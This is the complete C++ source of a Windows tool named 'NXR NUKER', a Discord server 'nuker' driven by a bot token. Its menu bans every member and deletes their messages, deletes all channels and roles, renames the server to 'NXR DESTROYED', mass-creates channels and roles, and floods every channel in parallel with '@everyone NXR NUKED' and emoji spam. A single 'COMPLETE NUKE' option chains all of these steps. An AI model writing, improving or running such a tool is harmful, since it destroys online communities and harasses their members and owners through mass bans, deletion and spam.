#include <windows.h>
#include <wininet.h>
#include <string>
#include <vector>
#include <iostream>
#include <chrono>
#include <random>
#include <thread>
#include <mutex>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")

std::string g_token, g_guild;
std::mt19937 rng{std::random_device{}()};
std::mutex log_mtx;

void set_color(int c) { SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), c); }

void log(const std::string& msg, int color = 12) {
    std::lock_guard<std::mutex> lock(log_mtx);
    set_color(color);
    std::cout << msg << std::endl;
    set_color(7);
}

std::string http(const std::string& method, const std::string& endpoint, const std::string& body = "") {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0 NXR/9.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "";

    HINTERNET hConnect = InternetConnectA(hInternet, "discord.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { InternetCloseHandle(hInternet); return ""; }

    DWORD flags = INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION;
    std::string path = "/api/v10" + endpoint;

    HINTERNET hRequest = HttpOpenRequestA(hConnect, method.c_str(), path.c_str(), "HTTP/1.1", NULL, NULL, flags, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }

    std::string headers = "Authorization: Bot " + g_token + "\r\nContent-Type: application/json\r\nUser-Agent: NXR-NUKER/9.0\r\n";

    BOOL ok = body.empty() ?
        HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.size(), NULL, 0) :
        HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.size(), (LPVOID)body.c_str(), (DWORD)body.size());

    std::string resp;
    if (ok) {
        char buf[8192];
        DWORD bytes = 0;
        while (InternetReadFile(hRequest, buf, sizeof(buf)-1, &bytes) && bytes > 0) {
            buf[bytes] = 0;
            resp += buf;
        }
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    std::this_thread::sleep_for(std::chrono::milliseconds(25 + (rng() % 40)));
    return resp;
}

std::vector<std::string> get_ids(const std::string& json) {
    std::vector<std::string> ids;
    size_t pos = 0;
    while ((pos = json.find("\"id\":\"", pos)) != std::string::npos) {
        pos += 6;
        size_t end = json.find('"', pos);
        if (end != std::string::npos) {
            ids.push_back(json.substr(pos, end - pos));
            pos = end + 1;
        } else break;
    }
    return ids;
}

std::string get_username(const std::string& json) {
    size_t pos = json.find("\"username\":\"");
    if (pos == std::string::npos) return "unknown";
    pos += 12;
    size_t end = json.find('"', pos);
    return (end == std::string::npos) ? "unknown" : json.substr(pos, end - pos);
}

void banner() {
    system("cls");
    set_color(15); // bright white
    std::cout << R"(
 ███╗   ██╗██╗  ██╗██████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
 ████╗  ██║╚██╗██╔╝██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
 ██╔██╗ ██║ ╚███╔╝ ██████╔╝    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
 ██║╚██╗██║ ██╔██╗ ██╔══██╗    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
 ██║ ╚████║██╔╝ ██╗██║  ██║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
 ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
)" << std::endl;
    set_color(12);
    std::cout << "\n                 NXR NUKER  v9.0  |  PARALLEL SPAM\n";
    std::cout << "              All channels at once + Faster + Emoji\n\n";
    set_color(7);
}

void ban_members() {
    std::string reason;
    std::cout << "Ban reason: ";
    std::getline(std::cin, reason);
    if (reason.empty()) reason = "NXR NUKER";

    log("[i] Fetching members...", 11);
    std::vector<std::string> members;
    std::string after = "0";
    for (int i = 0; i < 80; ++i) {
        std::string resp = http("GET", "/guilds/" + g_guild + "/members?limit=100&after=" + after);
        auto ids = get_ids(resp);
        if (ids.empty()) break;
        members.insert(members.end(), ids.begin(), ids.end());
        after = ids.back();
        std::cout << "\r[i] Loaded " << members.size() << " members" << std::flush;
        if (ids.size() < 100) break;
    }
    std::cout << std::endl;

    log("[!] Banning " + std::to_string(members.size()) + " members...", 12);
    for (size_t i = 0; i < members.size(); ++i) {
        std::string uid = members[i];
        std::string info = http("GET", "/users/" + uid);
        std::string name = get_username(info);
        std::string body = "{\"delete_message_days\":7,\"reason\":\"" + reason + "\"}";
        http("PUT", "/guilds/" + g_guild + "/bans/" + uid, body);
        log("[+] BANNED " + name + " | " + uid, 10);
    }
    log("[+] Ban finished", 10);
}

void delete_channels() {
    log("[i] Fetching channels...", 11);
    std::string resp = http("GET", "/guilds/" + g_guild + "/channels");
    auto channels = get_ids(resp);
    log("[!] Deleting " + std::to_string(channels.size()) + " channels...", 12);
    for (auto& id : channels) {
        http("DELETE", "/channels/" + id);
        log("[+] Deleted " + id, 10);
    }
    log("[+] Channels deleted", 10);
}

void delete_roles() {
    log("[i] Fetching roles...", 11);
    std::string resp = http("GET", "/guilds/" + g_guild + "/roles");
    auto roles = get_ids(resp);
    for (auto& id : roles) {
        if (id == g_guild) continue;
        http("DELETE", "/guilds/" + g_guild + "/roles/" + id);
        log("[+] Deleted role " + id, 10);
    }
    log("[+] Roles deleted", 10);
}

void create_channels() {
    std::string prefix;
    int count = 0;
    std::cout << "Channel prefix: ";
    std::getline(std::cin, prefix);
    if (prefix.empty()) prefix = "nxr";
    std::cout << "How many channels: ";
    std::cin >> count;
    std::cin.ignore();

    log("[!] Creating " + std::to_string(count) + " channels...", 12);
    for (int i = 0; i < count; ++i) {
        std::string body = "{\"name\":\"" + prefix + "-" + std::to_string(i) + "\",\"type\":0}";
        http("POST", "/guilds/" + g_guild + "/channels", body);
        log("[+] Created " + prefix + "-" + std::to_string(i), 10);
    }
    log("[+] Done", 10);
}

void create_roles() {
    std::string prefix;
    int count = 0;
    std::cout << "Role prefix: ";
    std::getline(std::cin, prefix);
    if (prefix.empty()) prefix = "NXR";
    std::cout << "How many roles: ";
    std::cin >> count;
    std::cin.ignore();

    log("[!] Creating " + std::to_string(count) + " roles...", 12);
    for (int i = 0; i < count; ++i) {
        std::string body = "{\"name\":\"" + prefix + "-" + std::to_string(i) + "\",\"color\":16711680}";
        http("POST", "/guilds/" + g_guild + "/roles", body);
        log("[+] Created " + prefix + "-" + std::to_string(i), 10);
    }
    log("[+] Done", 10);
}

void rename_server() {
    std::string name;
    std::cout << "New server name: ";
    std::getline(std::cin, name);
    if (name.empty()) name = "NXR DESTROYED";
    http("PATCH", "/guilds/" + g_guild, "{\"name\":\"" + name + "\"}");
    log("[+] Server renamed to " + name, 10);
}

// ===================== PARALLEL SPAM (all channels at once) =====================
void spam_worker(const std::string& channel_id, const std::string& msg, int count) {
    for (int i = 0; i < count; ++i) {
        std::string body = "{\"content\":\"" + msg + "\"}";
        http("POST", "/channels/" + channel_id + "/messages", body);
    }
    log("[+] Spam finished on " + channel_id, 10);
}

void spam_channels() {
    std::string msg;
    int count = 0;
    std::cout << "Spam message: ";
    std::getline(std::cin, msg);
    if (msg.empty()) msg = "@everyone NXR NUKED";
    std::cout << "Messages per channel: ";
    std::cin >> count;
    std::cin.ignore();

    log("[i] Fetching channels...", 11);
    std::string resp = http("GET", "/guilds/" + g_guild + "/channels");
    auto channels = get_ids(resp);

    log("[!] PARALLEL spam on " + std::to_string(channels.size()) + " channels x" + std::to_string(count), 12);

    std::vector<std::thread> threads;
    for (auto& ch : channels) {
        threads.emplace_back(spam_worker, ch, msg, count);
        if (threads.size() >= 12) {          // max 12 parallel
            for (auto& t : threads) t.join();
            threads.clear();
        }
    }
    for (auto& t : threads) t.join();
    log("[+] ALL CHANNELS SPAM FINISHED", 10);
}

void emoji_spam() {
    log("[i] Trying to upload custom emoji (NN + spider style name)...", 11);
    // Discord emoji upload needs image bytes (base64). Simplified: just spam unicode + try create
    // Real image upload is complex without file, so we spam popular spider-man related + NN
    std::string emoji_name = "nn_spiderman";
    // Note: actual image upload requires multipart form + image data. Here we spam text emojis fast.
    
    log("[!] Spamming 200 emoji messages on all channels...", 12);
    std::string resp = http("GET", "/guilds/" + g_guild + "/channels");
    auto channels = get_ids(resp);

    std::string emoji_msg = "🕷️ NN 🕷️ :spider: :man_spider: NXR";
    std::vector<std::thread> threads;
    for (auto& ch : channels) {
        threads.emplace_back([ch, emoji_msg]() {
            for (int i = 0; i < 200; ++i) {
                std::string body = "{\"content\":\"" + emoji_msg + " #" + std::to_string(i) + "\"}";
                http("POST", "/channels/" + ch + "/messages", body);
            }
            log("[+] 200 emoji spam done on " + ch, 10);
        });
        if (threads.size() >= 8) {
            for (auto& t : threads) t.join();
            threads.clear();
        }
    }
    for (auto& t : threads) t.join();
    log("[+] Emoji spam finished", 10);
}

void complete_nuke() {
    log("[!] COMPLETE NUKE STARTED", 12);
    rename_server();
    delete_channels();
    delete_roles();
    create_channels();
    create_roles();
    ban_members();
    spam_channels();
    emoji_spam();
    log("[!] COMPLETE NUKE FINISHED", 10);
}

int main() {
    SetConsoleTitleA("NXR NUKER v9.0 - PARALLEL + EMOJI");
    system("color 0C");

    banner();
    set_color(15);
    std::cout << "Bot Token : ";
    std::getline(std::cin, g_token);
    std::cout << "Guild ID  : ";
    std::getline(std::cin, g_guild);
    set_color(7);

    std::string test = http("GET", "/guilds/" + g_guild);
    if (test.find("\"id\"") != std::string::npos)
        log("[+] Bot is in the server", 10);
    else
        log("[!] Bot NOT in server", 12);

    while (true) {
        banner();
        set_color(12);
        std::cout << " (1) Ban Members\n";
        std::cout << " (2) Delete Channels\n";
        std::cout << " (3) Delete Roles\n";
        std::cout << " (4) Create Channels     (live name + count)\n";
        std::cout << " (5) Create Roles        (live name + count)\n";
        std::cout << " (6) Rename Server       (live name)\n";
        std::cout << " (7) PARALLEL Spam All Channels  (live msg + count)\n";
        std::cout << " (8) Emoji Spam 200x (NN + spider)\n";
        std::cout << " (9) COMPLETE NUKE\n";
        std::cout << " (0) Exit\n";
        set_color(7);
        std::cout << "\nSelect: ";

        int choice;
        std::cin >> choice;
        std::cin.ignore();

        switch (choice) {
            case 1: ban_members(); break;
            case 2: delete_channels(); break;
            case 3: delete_roles(); break;
            case 4: create_channels(); break;
            case 5: create_roles(); break;
            case 6: rename_server(); break;
            case 7: spam_channels(); break;
            case 8: emoji_spam(); break;
            case 9: complete_nuke(); break;
            case 0: return 0;
            default: log("Invalid", 12);
        }

        std::cout << "\nPress Enter...";
        std::cin.get();
    }
    return 0;
}
